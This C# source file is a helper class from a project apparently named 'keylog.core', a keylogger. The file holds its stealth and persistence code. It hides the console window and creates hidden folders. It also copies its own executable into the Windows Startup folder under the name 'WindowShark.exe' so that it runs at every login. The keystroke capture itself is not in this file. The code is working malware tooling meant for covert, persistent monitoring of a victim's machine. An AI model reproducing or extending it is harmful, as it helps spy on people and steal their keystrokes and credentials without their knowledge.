using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace keylog.core
{
    class Helper
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        private IntPtr myConsole;
        private static String executableName = "/WindowShark.exe";

        public Helper()
        {
            myConsole = GetConsoleWindow();
        }

        public void HideConsole()
        {
            ShowWindow(myConsole, SW_HIDE);   
        }

        public void MakeFolderStructure(String pathFolder)
        {
            if (!Directory.Exists(pathFolder))
            {
                Directory.CreateDirectory(pathFolder).Attributes = FileAttributes.Directory | FileAttributes.Hidden; ;
            }
        }

        public void PrepareExecutable()
        {        
            if(!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + executableName))
            {
                if (GetExecutablePath() != Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                {
                    Debugger.Log(0, null, GetExecutablePath());
                    File.Copy(GetExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + executableName, true);
                }
            }
        }

        private static string GetExecutablePath()
        {
            return Application.ExecutablePath;
        }

        private static string GetStartupPath()
        {
            return Application.StartupPath;
        }
    }
}
